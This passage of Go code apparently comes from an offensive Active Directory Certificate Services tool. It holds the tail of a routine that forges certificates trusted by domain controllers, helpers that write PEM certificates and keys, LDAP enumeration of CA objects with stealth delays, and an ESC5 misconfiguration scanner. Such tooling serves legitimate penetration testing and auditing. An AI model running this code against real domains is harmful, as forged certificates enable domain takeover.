	fmt.Printf("[!] This certificate chains to the real CA — domain controllers will trust it\n")

	return cert, certKey, nil
}

// WriteCertPEM writes a certificate to a PEM file.
func WriteCertPEM(cert *x509.Certificate, filename string) error {
	file, err := os.Create(filename)
	if err != nil {
		return fmt.Errorf("failed to create file: %w", err)
	}
	defer file.Close()

	block := &pem.Block{Type: "CERTIFICATE", Bytes: cert.Raw}
	if err := pem.Encode(file, block); err != nil {
		return fmt.Errorf("failed to write PEM: %w", err)
	}
	return nil
}

// WriteECPrivateKey writes an ECDSA private key to a writer in PEM format.
func WriteECPrivateKey(w io.Writer, key *ecdsa.PrivateKey) error {
	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		return fmt.Errorf("marshal EC key: %w", err)
	}
	return pem.Encode(w, &pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
}

// buildCertTemplateBaseDN constructs the LDAP base DN for certificate templates.
func buildCertTemplateBaseDN(domain string) string {
	parts := strings.Split(domain, ".")
	var dcParts []string
	for _, p := range parts {
		dcParts = append(dcParts, "DC="+p)
	}
	return "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration," + strings.Join(dcParts, ",")
}

// buildBindDN constructs a bind DN from username and domain.
func buildBindDN(username, domain string) string {
	if strings.Contains(username, "@") || strings.Contains(username, "CN=") {
		return username
	}
	return username + "@" + domain
}

// buildCABaseDN returns the LDAP base DN for the Certification Authorities container.
func buildCABaseDN(domain string) string {
	parts := strings.Split(domain, ".")
	var dcParts []string
	for _, p := range parts {
		dcParts = append(dcParts, "DC="+p)
	}
	return "CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration," + strings.Join(dcParts, ",")
}

// CAObject holds the LDAP attributes of a CA object in the PKI Services container.
type CAObject struct {
	Name               string
	DN                 string
	SecurityDescriptor []byte
}

// EnumerateCAs queries LDAP for CA objects under CN=Certification Authorities and
// returns their names, DNs, and raw nTSecurityDescriptors for ESC5 analysis.
func EnumerateCAs(cfg *ADCSConfig) ([]CAObject, error) {
	conn, err := connectLDAP(cfg)
	if err != nil {
		return nil, fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	baseDN := buildCABaseDN(cfg.Domain)
	filter := "(objectClass=certificationAuthority)"
	attrs := []string{"cn", "distinguishedName", "nTSecurityDescriptor"}

	searchReq := ldap.NewSearchRequest(
		baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases,
		0, 0, false, filter, attrs, nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil {
		return nil, fmt.Errorf("LDAP search failed: %w", err)
	}

	var cas []CAObject
	for _, entry := range result.Entries {
		ca := CAObject{
			Name:               entry.GetAttributeValue("cn"),
			DN:                 entry.GetAttributeValue("distinguishedName"),
			SecurityDescriptor: entry.GetRawAttributeValue("nTSecurityDescriptor"),
		}
		cas = append(cas, ca)
		stealthDelay(cfg)
	}
	return cas, nil
}

// ScanESC5 enumerates CA objects and returns ESC5 findings — cases where
// non-privileged trustees hold dangerous write access on the CA object itself.
// ESC5 allows an attacker to gain control of the CA and issue arbitrary certificates.
func ScanESC5(cfg *ADCSConfig) ([]ESC5Finding, error) {
	cas, err := EnumerateCAs(cfg)
	if err != nil {
		return nil, fmt.Errorf("enumerate CAs: %w", err)
	}

	var all []ESC5Finding
	for _, ca := range cas {
		findings, err := CheckESC5(ca.Name, ca.DN, ca.SecurityDescriptor)
		if err != nil {
			fmt.Printf("[!] ESC5 parse error for %s: %v\n", ca.Name, err)
			continue
		}
		if len(findings) > 0 {
			fmt.Printf("[!] ESC5 VULNERABLE: %s — %d dangerous ACE(s)\n", ca.Name, len(findings))
		}
		all = append(all, findings...)
	}
	return all, nil
}
